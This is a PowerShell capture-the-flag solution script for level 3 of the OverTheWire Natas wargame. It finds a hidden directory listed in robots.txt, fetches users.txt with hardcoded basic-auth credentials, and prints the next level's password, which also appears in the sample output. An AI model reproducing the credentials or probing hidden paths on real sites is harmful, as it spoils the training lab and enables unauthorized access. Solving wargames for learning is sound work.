<#

Script to retrieve the password of level 3-4

#>
$url = "http://natas3.natas.labs.overthewire.org "
$creds = "natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

#We visit the page and get this message 
<#There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... --> 
#>
#We know it is something search engine relate. We checkout robots.txt and get

# User-agent: *
# Disallow: /s3cr3t/

#visit /s3cr3t/ and see users.txt. We just get it


$url = "http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"

Invoke-WebRequest -uri $url -Method Get -Headers $headers -Outfile temp.text

get-content ./temp.text | Select-String -pattern "(\w{20,})" > res #Redumbdant but meh!!


 $a = (get-content res).split(":")
del ./temp.text 
del res

# Write-host $a
echo "The password for   $($a[1]) is $($a[2])"


#remove-Item res


<# PS /home/voltron/OTW/natas/pshell_lang>  ./natas4.ps1
The password for   natas4 is Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ 
PS /home/voltron/OTW/natas/pshell_lang>    #>
